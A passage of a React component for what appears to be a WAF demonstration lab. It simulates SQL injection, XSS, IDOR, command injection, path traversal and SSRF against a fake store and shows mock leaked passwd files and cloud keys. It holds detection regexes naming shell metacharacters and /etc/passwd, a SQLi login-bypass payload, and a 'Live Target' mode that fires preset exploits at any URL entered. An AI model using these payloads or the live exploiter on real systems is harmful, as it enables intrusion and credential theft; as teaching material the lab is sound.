    if (hasPayload) {
      const isSql = /union|select|or\s+1\s*=\s*1|--|\/\*/i.test(query);
      const res = executeRequest(
        `q=${encodeURIComponent(query)}`,
        "q",
        "GET",
        `/api/products/search?q=${encodeURIComponent(query)}`,
        isSql ? "sqli-search" : "reflected-xss"
      );

      // CRITICAL: If WAF blocked it, do NOT execute or display exploit data!
      if (res.blocked) {
        setActiveExploitDisplay(null);
        return;
      }

      // WAF is OFF: show exploit result
      if (isSql) {
        setActiveExploitDisplay({
          vulnId: "sqli-search",
          title: "💥 SQL Injection — Database Rows Leaked!",
          description: "Search filter concatenated input into SQL query without parameterization.",
          evidence: `SELECT * FROM products WHERE name LIKE '%${query}%' --\nRows returned from 'users' table:\nadmin | $2y$12$eX0... | sk_live_9981_apex_titan\nceo_vance | $2y$12$kP8... | corp_card_vault_access`,
          data: [
            { user: "admin", role: "superadmin", pass_hash: "$2y$12$eX0...hashed", secret: "sk_live_9981_apex_titan" },
            { user: "ceo_vance", role: "executive", pass_hash: "$2y$12$kP8...hashed", secret: "corp_card_vault_access" },
          ],
        });
      } else {
        setActiveExploitDisplay({
          vulnId: "reflected-xss",
          title: "💥 Reflected XSS — Script Injected into DOM!",
          description: "Search query echoed in HTML response without context-aware HTML encoding.",
          evidence: `Search Results for: ${query}\nPayload executed in active browser session context.`,
        });
      }
    }
  };

  // Handler: Login
  const handleLoginSubmit = (uname: string, pword: string) => {
    const isSqli = /'|--|union|or\s+1\s*=\s*1|\/\*/i.test(uname + pword);
    const res = executeRequest(
      `username=${encodeURIComponent(uname)}&password=${encodeURIComponent(pword)}`,
      "username",
      "POST",
      "/api/auth/login",
      isSqli ? "sqli-login" : undefined
    );

    // CRITICAL: If WAF blocked it, stop immediately!
    if (res.blocked) {
      setActiveExploitDisplay(null);
      return;
    }

    // If WAF is OFF and SQLi was used: bypass login to admin
    if (isSqli) {
      const adminUser = FAKE_USERS[0];
      setCurrentUser(adminUser);
      setActiveExploitDisplay({
        vulnId: "sqli-login",
        title: "💥 SQL Injection — Authentication Bypassed!",
        description: "SQL statement evaluated to TRUE without password validation.",
        evidence: `Payload: ${uname}\nAuthenticated as: ${adminUser.name} (${adminUser.role})`,
        data: adminUser,
      });
      toast.success("Bypassed Login via SQLi", { description: "Logged in as SuperAdmin! Unlocked Admin & Diagnostics." });
      navigateTo("admin");
      return;
    }

    const matched = FAKE_USERS.find((u) => u.username === uname && u.password === pword);
    if (matched) {
      setCurrentUser(matched);
      toast.success(`Welcome back, ${matched.name}!`);
      navigateTo("dashboard");
    } else {
      toast.error("Invalid credentials (try admin/admin123 or jsmith/password)");
    }
  };

  // Handler: Post Review (Stored XSS)
  const handleAddReview = () => {
    if (!newReviewComment.trim()) return;
    const isXss = /<script|onerror|onload|<img|<svg/i.test(newReviewAuthor + newReviewComment);
    const res = executeRequest(
      `author=${encodeURIComponent(newReviewAuthor)}&rating=${newReviewRating}&comment=${encodeURIComponent(
        newReviewComment
      )}&productId=${selectedProduct.id}`,
      "comment",
      "POST",
      `/api/products/${selectedProduct.id}/reviews`,
      isXss ? "stored-xss" : undefined
    );

    if (res.blocked) {
      setActiveExploitDisplay(null);
      return;
    }

    const newRev: ProductReview = {
      id: uid("REV"),
      author: newReviewAuthor,
      rating: newReviewRating,
      date: "Just now",
      comment: newReviewComment,
      isExploit: isXss,
    };
    setReviews((prev) => [newRev, ...prev]);
    if (isXss) {
      setActiveExploitDisplay({
        vulnId: "stored-xss",
        title: "💥 Stored XSS — Script Stored in Database!",
        description: "Customer review stored without sanitization. Executes for all visitors.",
        evidence: `Stored: ${newReviewComment}\nTarget: Product #${selectedProduct.id}`,
      });
    } else {
      toast.success("Review posted successfully!");
    }
    setNewReviewComment("");
  };

  // Handler: IDOR Order Lookup
  const handleOrderLookup = (idToLookup: string) => {
    const res = executeRequest(
      `order_id=${idToLookup}`,
      "order_id",
      "GET",
      `/api/orders/${idToLookup}`,
      "idor"
    );

    if (res.blocked) {
      setLookedUpOrder(null);
      setActiveExploitDisplay(null);
      return;
    }

    const order = ORDER_RECORDS[idToLookup];
    if (order) {
      setLookedUpOrder(order);
      if (order.isConfidential) {
        setActiveExploitDisplay({
          vulnId: "idor",
          title: `💥 IDOR Exploit — Confidential Order #${order.id} Exposed!`,
          description: "Resource accessed without user session authorization.",
          evidence: `Order #${order.id} | Customer: ${order.customerName} | Card: ${order.cardLast4} | Total: $${order.total}`,
          data: order,
        });
      }
    } else {
      setLookedUpOrder(null);
      toast.info(`Order #${idToLookup} not found.`);
    }
  };

  // Handler: Network Ping (Command Injection)
  const handlePingExecute = (cmd: string) => {
    setPingHost(cmd);
    const isCmdi = /;|`|\||\$\(|whoami|cat\s|id$|dir/i.test(cmd);
    const res = executeRequest(
      `host=${encodeURIComponent(cmd)}`,
      "host",
      "POST",
      "/api/diagnostics/ping",
      isCmdi ? "cmdi" : undefined
    );

    if (res.blocked) {
      setPingOutput("❌ 403 Forbidden: Command execution intercepted by WebGuard WAF.");
      setActiveExploitDisplay(null);
      return;
    }

    if (isCmdi) {
      const simulatedOutput = `PING ${cmd.split(";")[0]} (56 data bytes)\n64 bytes from ${cmd.split(";")[0]}: icmp_seq=1 ttl=118 time=12.4 ms\n\n--- EXECUTED SYSTEM COMMAND OUTPUT ---\nuid=0(root) gid=0(root) groups=0(root)\nLinux apex-cloud-prod-node01 5.15.0-89-generic #99-Ubuntu SMP\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`;
      setPingOutput(simulatedOutput);
      setActiveExploitDisplay({
        vulnId: "cmdi",
        title: "💥 Remote Command Execution (RCE) Succeeded!",
        description: "OS command executed with root privileges on backend server.",
        evidence: `Executed command: ${cmd}\nPrivileges: root (uid=0)`,
      });
    } else {
      setPingOutput(`PING ${cmd} (56 data bytes)\n64 bytes from ${cmd}: icmp_seq=1 ttl=118 time=14.2 ms\n2 packets transmitted, 2 received, 0% packet loss`);
    }
  };

  // Handler: File Downloader (Path Traversal)
  const handleTraversalExecute = (filepath: string) => {
    setTraversalPath(filepath);
    const isTraversal = /\.\.\/|\.\.\\|%2e%2e|etc\/passwd/i.test(filepath);
    const res = executeRequest(
      `file=${encodeURIComponent(filepath)}`,
      "file",
      "GET",
      `/api/reports/download?file=${encodeURIComponent(filepath)}`,
      isTraversal ? "path-traversal" : undefined
    );

    if (res.blocked) {
      setTraversalOutput("❌ 403 Forbidden: Path traversal pattern blocked by WebGuard WAF.");
      setActiveExploitDisplay(null);
      return;
    }

    if (isTraversal) {
      const simulatedFile = `[SERVER FILE DUMP: ${filepath}]\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\npostgres:x:109:117:PostgreSQL administrator:/var/lib/postgresql:/bin/bash\n\n# Database Credentials\nDB_USER=apex_root\nDB_PASS=Sup3rS3cur3P@ssw0rd!2026\nJWT_SECRET_KEY=apex_master_jwt_secret_994182`;
      setTraversalOutput(simulatedFile);
      setActiveExploitDisplay({
        vulnId: "path-traversal",
        title: "💥 Path Traversal / LFI Succeeded!",
        description: "Arbitrary server files read via directory traversal.",
        evidence: `File: ${filepath}\nExtracted /etc/passwd & DB secrets.`,
      });
    } else {
      setTraversalOutput(`[Apex System Report]\nGenerated: ${new Date().toISOString()}\nStatus: All subsystems operational.`);
    }
  };

  // Handler: Webhook SSRF
  const handleWebhookExecute = (url: string) => {
    setWebhookUrl(url);
    const isSsrf = /169\.254|127\.0\.0\.1|localhost|internal/i.test(url);
    const res = executeRequest(
      `url=${encodeURIComponent(url)}`,
      "url",
      "POST",
      "/api/webhooks/verify",
      isSsrf ? "ssrf" : undefined
    );

    if (res.blocked) {
      setWebhookOutput("❌ 403 Forbidden: SSRF to internal CIDR blocked by WebGuard WAF.");
      setActiveExploitDisplay(null);
      return;
    }

    if (isSsrf) {
      const simulatedMetadata = `{\n  "Code": "Success",\n  "Type": "AWS-HMAC",\n  "AccessKeyId": "ASIAV4PEXMASTERKEY77",\n  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n  "Token": "IQoJb3JpZ2luX2VjEOr...[TEMPORARY_IAM_ROLE_CREDENTIALS]",\n  "RoleName": "ApexCloudInfrastructureSuperAdminRole"\n}`;
      setWebhookOutput(simulatedMetadata);
      setActiveExploitDisplay({
        vulnId: "ssrf",
        title: "💥 SSRF Exploit Succeeded!",
        description: "Cloud metadata credentials extracted from internal 169.254.169.254 endpoint.",
        evidence: `Target: ${url}\nIAM Role: ApexCloudInfrastructureSuperAdminRole`,
      });
    } else {
      setWebhookOutput(`{"status": "ok", "target": "${url}", "response_code": 200}`);
    }
  };

  // Filter products by category & search
  const filteredProducts = useMemo(() => {
    return PRODUCTS.filter((p) => {
      const matchesCategory = selectedCategory === "all" || p.category === selectedCategory;
      const matchesSearch =
        !searchQuery ||
        p.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        p.description.toLowerCase().includes(searchQuery.toLowerCase());
      return matchesCategory && matchesSearch;
    });
  }, [selectedCategory, searchQuery]);

  // Total cart items & cost
  const cartTotal = useMemo(() => {
    return cart.reduce((sum, item) => sum + item.product.price * item.quantity, 0);
  }, [cart]);

  const urlPath =
    currentPage === "home"
      ? "/"
      : currentPage === "products"
      ? "/products"
      : currentPage === "product-detail"
      ? `/products/${selectedProduct.id}`
      : currentPage === "cart"
      ? "/account/cart-orders"
      : currentPage === "dashboard"
      ? "/account/dashboard"
      : currentPage === "diagnostics"
      ? "/system/diagnostics"
      : currentPage === "admin"
      ? "/admin/vault"
      : currentPage === "docs"
      ? "/knowledge-base"
      : `/${currentPage}`;

  return (
    <div className="flex flex-col gap-4 text-slate-800">
      {/* Main Sandbox Grid (Top Banner Removed for Clean Streamlined Design) */}
      <div className="grid grid-cols-1 gap-4 xl:grid-cols-12">
        {/* ═══════════════════════════════════════════════════════════════════
            LEFT: Interactive Simulated Website (Light-Themed Browser Frame)
        ════════════════════════════════════════════════════════════════════ */}
        <div className="xl:col-span-7 flex flex-col gap-3">
          <div className="overflow-hidden p-0 shadow-sm rounded-2xl border border-slate-200 bg-white text-slate-900">
            {/* Top Frame Mode Switcher Bar */}
            <div className="flex flex-wrap items-center justify-between border-b border-slate-200 bg-slate-200/80 px-4 py-1.5 gap-2 text-xs">
              <div className="flex items-center gap-1.5">
                <button
                  type="button"
                  onClick={() => setLabMode("app")}
                  className={cn(
                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-[11px] font-bold transition-all cursor-pointer",
                    labMode === "app"
                      ? "bg-white text-cyan-700 shadow-sm border border-slate-300"
                      : "text-slate-600 hover:text-slate-900 hover:bg-slate-300/60"
                  )}
                >
                  <ShoppingCart className="size-3" />
                  <span>ApexStore Web App</span>
                </button>
                <button
                  type="button"
                  onClick={() => setLabMode("live-target")}
                  className={cn(
                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-[11px] font-bold transition-all cursor-pointer",
                    labMode === "live-target"
                      ? "bg-white text-cyan-700 shadow-sm border border-slate-300"
                      : "text-slate-600 hover:text-slate-900 hover:bg-slate-300/60"
                  )}
                >
                  <Globe2 className="size-3" />
                  <span>Live Target URL Exploiter & Proxy</span>
                  <span className="rounded bg-cyan-100 text-cyan-800 px-1.5 py-0.2 text-[9px] font-extrabold uppercase tracking-wide">
                    Live
                  </span>
                </button>
              </div>

              <div className="flex items-center gap-2 text-[10px] text-slate-600 font-medium">
                <span>Mode:</span>
                <span className={cn("font-bold font-mono", activeWaf ? "text-emerald-700" : "text-amber-700")}>
                  {activeWaf ? "🛡️ WAF Blocking" : "⚠️ Raw Origin (WAF Off)"}
                </span>
              </div>
            </div>

            {/* Browser Window Chrome */}
            <div className="flex items-center gap-2.5 border-b border-slate-200 bg-slate-100/90 px-4 py-2.5">
              <div className="flex items-center gap-1.5">
                <span className="size-3 rounded-full bg-rose-400 shadow-sm" />
                <span className="size-3 rounded-full bg-amber-400 shadow-sm" />
                <span className="size-3 rounded-full bg-emerald-400 shadow-sm" />
              </div>

              {/* Navigation Controls */}
              <div className="flex items-center gap-1 text-slate-500 ml-1">
                <button
                  type="button"
                  onClick={() => (labMode === "app" ? navigateTo("home") : handleExecuteLiveProbe())}
                  className="rounded p-1 hover:bg-slate-200 hover:text-slate-900 transition"
                  title="Home / Reload"
                >
                  <Home className="size-3.5" />
                </button>
                <button
                  type="button"
                  onClick={() => {
                    if (labMode === "app") {
                      setNavigating(true);
                      setTimeout(() => setNavigating(false), 120);
                    } else {
                      handleExecuteLiveProbe();
                    }
                  }}
                  className="rounded p-1 hover:bg-slate-200 hover:text-slate-900 transition"
                  title="Reload"
                >
                  <RefreshCw className={cn("size-3.5", (navigating || executingLive) && "animate-spin")} />
                </button>
              </div>

              {/* URL Address Bar */}
              {labMode === "app" ? (
                <div className="flex flex-1 items-center gap-2 rounded-xl border border-slate-300 bg-white px-3 py-1.5 shadow-sm">
                  <Lock className={cn("size-3.5 shrink-0", activeWaf ? "text-emerald-600" : "text-amber-500")} />
                  <span className="flex-1 truncate font-mono text-xs text-slate-700">
                    https://apex-cyberstore.io<span className="text-cyan-600 font-bold">{urlPath}</span>
                  </span>
                  <button
                    type="button"
                    onClick={() => setInternalWafOn((v) => !v)}
                    title="Click to toggle WAF inspection mode"
                    className={cn(
                      "flex items-center gap-1 text-[9px] font-bold px-2 py-0.5 rounded-md border transition-all cursor-pointer",
                      activeWaf
                        ? "bg-emerald-50 text-emerald-700 border-emerald-300 hover:bg-emerald-100"
                        : "bg-red-50 text-red-700 border-red-300 hover:bg-red-100"
                    )}
                  >
                    {activeWaf ? <Shield className="size-2.5" /> : <ShieldOff className="size-2.5" />}
                    {activeWaf ? "WAF PROXIED (CLICK TO DISABLE)" : "WAF OFF (CLICK TO ENABLE)"}
                  </button>
                </div>
              ) : (
                <div className="flex flex-1 items-center gap-2 rounded-xl border border-slate-300 bg-white px-2 py-1 shadow-sm">
                  <Globe2 className={cn("size-3.5 shrink-0 ml-1", activeWaf ? "text-emerald-600" : "text-amber-500")} />
                  <Input
                    value={targetUrlInput}
                    onChange={(e) => setTargetUrlInput(e.target.value)}
                    placeholder="https://target.example.com or http://localhost:8080"
                    className="h-7 flex-1 border-0 bg-transparent px-1 font-mono text-xs text-slate-800 shadow-none focus-visible:ring-0"
                  />
                  <button
                    type="button"
                    onClick={() => setInternalWafOn((v) => !v)}
                    title="Click to toggle WAF inspection mode"
                    className={cn(
                      "flex items-center gap-1 text-[9px] font-bold px-2 py-0.5 rounded-md border transition-all cursor-pointer",
                      activeWaf
                        ? "bg-emerald-50 text-emerald-700 border-emerald-300 hover:bg-emerald-100"
                        : "bg-red-50 text-red-700 border-red-300 hover:bg-red-100"
                    )}
                  >
                    {activeWaf ? <Shield className="size-2.5" /> : <ShieldOff className="size-2.5" />}
                    {activeWaf ? "WAF PROXIED (CLICK TO DISABLE)" : "WAF OFF (CLICK TO ENABLE)"}
                  </button>
                </div>
              )}
            </div>

            {labMode === "live-target" ? (
              <div className="min-h-[500px] max-h-[720px] overflow-y-auto bg-slate-50/70 p-4 space-y-4">
                {/* Live Target Banner & View Mode Selector */}
                <div className="rounded-2xl border border-cyan-200 bg-gradient-to-r from-cyan-50 via-blue-50 to-indigo-50 p-4 shadow-sm space-y-3">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                    <div className="flex items-center gap-2.5">
                      <div className="flex size-9 items-center justify-center rounded-xl bg-cyan-600 text-white font-bold shadow-sm">
                        <Globe2 className="size-5" />
                      </div>
                      <div>
                        <h3 className="text-sm font-extrabold text-slate-900 flex items-center gap-2">
                          Live Target Proxy & Real-Time Exploiter
                          <Badge className={cn("text-[9px] font-mono", activeWaf ? "bg-emerald-600 text-white" : "bg-red-600 text-white")}>
                            {activeWaf ? "WAF ACTIVE (PROTECTED)" : "WAF DISABLED (EXPLOITABLE)"}
                          </Badge>
                        </h3>
                        <p className="text-[11px] text-slate-600">
                          Target: <span className="font-mono font-bold text-cyan-800">{targetUrlInput || "http://localhost:8080"}</span> · Browse live in viewport & test real-time exploit vectors.
                        </p>
                      </div>
                    </div>

                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        onClick={() => setInternalWafOn((v) => !v)}
                        className={cn(
                          "flex items-center gap-1.5 rounded-xl border px-3 py-1.5 text-xs font-bold transition shadow-sm cursor-pointer",
                          activeWaf
                            ? "bg-emerald-600 text-white border-emerald-600 hover:bg-emerald-700"
                            : "bg-red-600 text-white border-red-600 hover:bg-red-700"
                        )}
                      >
                        {activeWaf ? <ShieldCheck className="size-3.5" /> : <ShieldAlert className="size-3.5" />}
                        <span>{activeWaf ? "WAF Protection Active" : "WAF Protection Disabled"}</span>
                      </button>

                      <a
                        href={targetUrlInput.startsWith("http") ? targetUrlInput : `http://${targetUrlInput}`}
                        target="_blank"
                        rel="noreferrer"
                        className="flex items-center gap-1 rounded-xl border border-slate-300 bg-white px-2.5 py-1.5 text-xs font-semibold text-slate-700 hover:bg-slate-100 shadow-sm"
                        title="Open Target in New Browser Window"
                      >
                        <ExternalLink className="size-3.5 text-cyan-600" />
                        <span>External</span>
                      </a>
                    </div>
                  </div>

                  {/* Sub-View Tabs */}
                  <div className="flex flex-wrap items-center justify-between border-t border-cyan-200/60 pt-2.5 gap-2">
                    <div className="flex items-center gap-1.5">
                      <button
                        type="button"
                        onClick={() => setLiveViewMode("viewport")}
                        className={cn(
                          "flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-xs font-bold transition cursor-pointer",
                          liveViewMode === "viewport"
                            ? "bg-cyan-600 text-white shadow-sm"
                            : "bg-white/80 text-slate-600 hover:bg-white hover:text-slate-900 border border-slate-200"
                        )}
                      >
                        <Laptop className="size-3.5" />
                        <span>Live Browser Viewport</span>
                      </button>

                      <button
                        type="button"
                        onClick={() => setLiveViewMode("exploit")}
                        className={cn(
                          "flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-xs font-bold transition cursor-pointer",
                          liveViewMode === "exploit"
                            ? "bg-cyan-600 text-white shadow-sm"
                            : "bg-white/80 text-slate-600 hover:bg-white hover:text-slate-900 border border-slate-200"
                        )}
                      >
                        <Terminal className="size-3.5" />
                        <span>Exploit & Probe Console</span>
                      </button>

                      <button
                        type="button"
                        onClick={() => setLiveViewMode("split")}
                        className={cn(
                          "flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-xs font-bold transition cursor-pointer",
                          liveViewMode === "split"
                            ? "bg-cyan-600 text-white shadow-sm"
                            : "bg-white/80 text-slate-600 hover:bg-white hover:text-slate-900 border border-slate-200"
                        )}
                      >
                        <Layers className="size-3.5" />
                        <span>Split View (Side-by-Side)</span>
                      </button>
                    </div>

                    <span className="text-[10px] text-slate-500 font-mono">
                      Target Gateway: {targetUrlInput || "http://localhost:8080"}
                    </span>
                  </div>
                </div>

                {/* ═══════════════════════════════════════════════════════════════
                    VIEWPORT / SPLIT MODE: Live Embedded Iframe
                ════════════════════════════════════════════════════════════════ */}
                {(liveViewMode === "viewport" || liveViewMode === "split") && (
                  <div className="rounded-2xl border border-slate-200 bg-white overflow-hidden shadow-sm space-y-0">
                    {/* Viewport Header Bar */}
                    <div className="flex items-center justify-between border-b border-slate-200 bg-slate-100 px-3 py-2 text-xs">
                      <div className="flex items-center gap-2">
                        <span className="flex size-2.5 rounded-full bg-emerald-500" />
                        <span className="font-mono text-[11px] font-bold text-slate-800 truncate max-w-sm">
                          {targetUrlInput.startsWith("http") ? targetUrlInput : `http://${targetUrlInput}`}
                        </span>
                      </div>

                      <div className="flex items-center gap-1.5">
                        <button
                          type="button"
                          onClick={() => setIframeKey((k) => k + 1)}
                          className="flex items-center gap-1 rounded px-2 py-1 text-[10px] font-medium text-slate-600 hover:bg-slate-200 transition"
                          title="Reload live page in iframe"
                        >
                          <RefreshCw className="size-3" />
                          <span>Reload Frame</span>
                        </button>
                      </div>
                    </div>

                    {/* The Live Iframe */}
                    <div className="relative w-full min-h-[380px] bg-slate-50">
                      <iframe
                        key={iframeKey}
                        src={proxiedIframeSrc}
                        title="Live Target Website"
                        className="w-full h-[460px] border-0 bg-white"
                        sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"
                      />

                      {/* Floating In-Viewport Exploit Injection Strip */}
                      <div className="border-t border-slate-200 bg-slate-900/95 backdrop-blur-sm p-3 text-white space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-[10px] font-bold uppercase tracking-wider text-cyan-400 flex items-center gap-1.5">
                            <Zap className="size-3 text-yellow-400" />
                            Live Target Exploit Quick-Inject (Click to Test Against Loaded Site):
                          </span>
                          <span className="text-[9px] font-mono text-slate-400">
                            WAF Status: {activeWaf ? "🛡️ 403 Interception Ready" : "⚠️ Exploitable"}
                          </span>
                        </div>

                        <div className="flex flex-wrap gap-1.5">
                          {LIVE_PRESETS.slice(0, 4).map((preset) => (
                            <button
                              key={preset.id}
                              type="button"
                              onClick={() => {
                                handleSelectPreset(preset);
                                setTimeout(() => handleExecuteLiveProbe(), 50);
                              }}
                              className="rounded-lg border border-slate-700 bg-slate-800 px-2.5 py-1 text-[10px] font-bold text-slate-200 hover:border-cyan-500 hover:text-white transition flex items-center gap-1 cursor-pointer"
                            >
                              <span className="rounded bg-slate-700 px-1 py-0.2 font-mono text-[8px] text-cyan-300">
                                {preset.category}
                              </span>
                              <span>{preset.name}</span>
                            </button>
                          ))}

                          <Button
                            size="sm"
                            type="button"
                            onClick={() => setLiveViewMode("exploit")}
                            className="h-6 px-2 text-[10px] rounded-lg bg-cyan-600 hover:bg-cyan-700 text-white font-bold ml-auto"
                          >
                            Open Full Console →
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* ═══════════════════════════════════════════════════════════════
                    EXPLOIT PROBE & PREVENTION CONSOLE
                ════════════════════════════════════════════════════════════════ */}
                {(liveViewMode === "exploit" || liveViewMode === "split") && (
                  <div className="space-y-4">
                    {/* Quick Exploit Vector Presets */}
                    <div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm space-y-2.5">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-slate-800 flex items-center gap-1.5">
                          <Flame className="size-3.5 text-red-600" />
                          Pre-Configured Exploit Vectors (Click to Load):
                        </span>
                        <span className="text-[10px] text-slate-500 font-mono">
                          {LIVE_PRESETS.length} Vectors Available
                        </span>
                      </div>

                      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 xl:grid-cols-4 gap-2">
                        {LIVE_PRESETS.map((preset) => (
                          <button
                            key={preset.id}
                            type="button"
                            onClick={() => handleSelectPreset(preset)}
                            className={cn(
                              "flex flex-col items-start p-2.5 rounded-xl border text-left transition-all cursor-pointer",
                              selectedPresetId === preset.id
                                ? "border-cyan-600 bg-cyan-50/70 text-cyan-900 shadow-sm ring-1 ring-cyan-600"
                                : "border-slate-200 bg-slate-50/50 hover:bg-slate-100/80 text-slate-700"
                            )}
                          >
                            <div className="flex items-center justify-between w-full mb-1">
                              <span className="rounded bg-slate-200 px-1.5 py-0.5 font-mono text-[8px] font-black text-slate-800">
                                {preset.category}
                              </span>
                              <span className="font-mono text-[9px] font-bold text-cyan-700">{preset.method}</span>
                            </div>
                            <span className="text-xs font-bold leading-snug line-clamp-1">{preset.name}</span>
                            <span className="text-[10px] text-slate-500 line-clamp-1 mt-0.5">{preset.path}</span>
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Request Builder Form */}
                    <div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm space-y-3">
                      <div className="flex items-center justify-between border-b border-slate-100 pb-2.5">
                        <span className="text-xs font-bold text-slate-800 flex items-center gap-1.5">
                          <Terminal className="size-3.5 text-cyan-600" />
                          HTTP Probe Configuration
                        </span>
                        <span className="text-[10px] font-mono text-slate-500">
                          Target: {targetUrlInput || "http://localhost:8080"}
                        </span>
                      </div>

                      <div className="grid grid-cols-1 sm:grid-cols-12 gap-2.5 items-center">
                        <div className="sm:col-span-3">
                          <label className="block text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-1">
                            HTTP Method
                          </label>
                          <Select value={customMethod} onValueChange={(v) => setCustomMethod(v as HttpMethod)}>
                            <SelectTrigger className="h-9 font-mono text-xs font-bold bg-slate-50 border-slate-300">
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="GET">GET</SelectItem>
                              <SelectItem value="POST">POST</SelectItem>
                              <SelectItem value="PUT">PUT</SelectItem>
                              <SelectItem value="DELETE">DELETE</SelectItem>
                              <SelectItem value="PATCH">PATCH</SelectItem>
                            </SelectContent>
                          </Select>
                        </div>

                        <div className="sm:col-span-9">
                          <label className="block text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-1">
                            Endpoint Path / Query
                          </label>
                          <Input
                            value={customPath}
                            onChange={(e) => setCustomPath(e.target.value)}
                            placeholder="/api/login"
                            className="h-9 font-mono text-xs bg-slate-50 border-slate-300"
                          />
                        </div>
                      </div>

                      <div>
                        <label className="block text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-1">
                          Request Headers
                        </label>
                        <Input
                          value={customHeaders}
                          onChange={(e) => setCustomHeaders(e.target.value)}
                          placeholder="Content-Type: application/x-www-form-urlencoded"
                          className="h-8 font-mono text-xs bg-slate-50 border-slate-300"
                        />
                      </div>

                      <div>
                        <div className="flex items-center justify-between mb-1">
                          <label className="text-[10px] font-bold uppercase tracking-wider text-slate-500">
                            Exploit Payload / Request Body
                          </label>
                          <span className="font-mono text-[9px] text-slate-400">
                            {customPayload.length} chars · High Threat Vector
                          </span>
                        </div>
                        <Textarea
                          value={customPayload}
                          onChange={(e) => setCustomPayload(e.target.value)}
                          rows={3}
                          placeholder="Enter raw exploit payload (e.g., admin' OR '1'='1' --)"
                          className="font-mono text-xs bg-slate-900 text-cyan-300 border-slate-700 resize-none"
                        />
                      </div>

                      {/* Action Buttons */}
                      <div className="flex flex-wrap items-center justify-between gap-2 pt-1">
                        <div className="flex items-center gap-2">
                          <Button
                            type="button"
                            disabled={executingLive}
                            onClick={handleExecuteLiveProbe}
                            className={cn(
                              "h-9 px-4 gap-2 font-bold text-xs rounded-xl shadow-sm text-white",
                              activeWaf
                                ? "bg-emerald-600 hover:bg-emerald-700"
                                : "bg-red-600 hover:bg-red-700"
                            )}
                          >
                            {executingLive ? (
                              <>
                                <RefreshCw className="size-3.5 animate-spin" />
                                <span>Executing Probe...</span>
                              </>
                            ) : (
                              <>
                                <Zap className="size-3.5" />
                                <span>{activeWaf ? "Test Exploit (WAF Intercept)" : "Fire Exploit (Origin Direct)"}</span>
                              </>
                            )}
                          </Button>

                          <Button
                            type="button"
                            variant="outline"
                            size="sm"
                            onClick={() => setInternalWafOn((v) => !v)}
                            className="h-9 gap-1.5 text-xs font-semibold border-slate-300 hover:bg-slate-100 cursor-pointer"
                          >
                            {activeWaf ? <ShieldOff className="size-3.5 text-red-600" /> : <ShieldCheck className="size-3.5 text-emerald-600" />}
                            <span>Switch to {activeWaf ? "WAF OFF" : "WAF ON"}</span>
                          </Button>
                        </div>

                        <span className="text-[10px] text-slate-500 font-mono">
                          Proxied via WebGuard Edge Rule Engine
                        </span>
                      </div>
                    </div>
                  </div>
                )}

                {/* Live Target Response Card */}
                {liveTargetResponse ? (
                  <div
                    className={cn(
                      "rounded-2xl border p-4.5 space-y-3.5 shadow-sm transition-all animate-in fade-in",
                      liveTargetResponse.blocked
                        ? "border-emerald-300 bg-emerald-50/60 text-slate-900"
                        : "border-red-300 bg-red-50/60 text-slate-900"
                    )}
                  >
                    {/* Banner Header */}
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b pb-3 border-current/10">
                      <div className="flex items-center gap-2.5">
                        <span
                          className={cn(
                            "flex size-8 items-center justify-center rounded-xl text-white font-black text-sm",
                            liveTargetResponse.blocked ? "bg-emerald-600" : "bg-red-600"
                          )}
                        >
                          {liveTargetResponse.blocked ? "🛡️" : "💥"}
                        </span>
                        <div>
                          <div className="flex items-center gap-2">
                            <h4 className="font-extrabold text-sm text-slate-900">
                              {liveTargetResponse.blocked
                                ? "403 Forbidden — Blocked by WebGuard AI WAF"
                                : "200 OK — Origin Vulnerability Exploited!"}
                            </h4>
                            <Badge
                              className={cn(
                                "font-mono text-[9px] font-black",
                                liveTargetResponse.blocked ? "bg-emerald-600 text-white" : "bg-red-600 text-white"
                              )}
                            >
                              HTTP {liveTargetResponse.status}
                            </Badge>
                          </div>
                          <p className="text-[11px] text-slate-600 mt-0.5">
                            {liveTargetResponse.blocked
                              ? `Virtual patch ${liveTargetResponse.ruleMatched} dropped the exploit at edge in ${liveTargetResponse.latencyMs}ms.`
                              : `Target origin executed unescaped payload and returned raw sensitive data in ${liveTargetResponse.latencyMs}ms.`}
                          </p>
                        </div>
                      </div>

                      <Button
                        size="sm"
                        onClick={() => {
                          setInternalWafOn(!activeWaf);
                          setTimeout(() => handleExecuteLiveProbe(), 50);
                        }}
                        className={cn(
                          "h-8 text-xs font-bold rounded-xl text-white shadow-sm shrink-0 cursor-pointer",
                          liveTargetResponse.blocked
                            ? "bg-red-600 hover:bg-red-700"
                            : "bg-emerald-600 hover:bg-emerald-700"
                        )}
                      >
                        {liveTargetResponse.blocked ? "🔄 Turn WAF OFF & Re-Test" : "🛡️ Turn WAF ON & Re-Test"}
                      </Button>
                    </div>

                    {/* Evidence Banner */}
                    <div className="rounded-xl border border-slate-200 bg-white p-3 space-y-1.5 font-mono text-xs shadow-sm">
                      <div className="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-wider">
                        <span>{liveTargetResponse.blocked ? "WAF Edge Enforcement Proof" : "Extracted Origin Vulnerability Evidence"}</span>
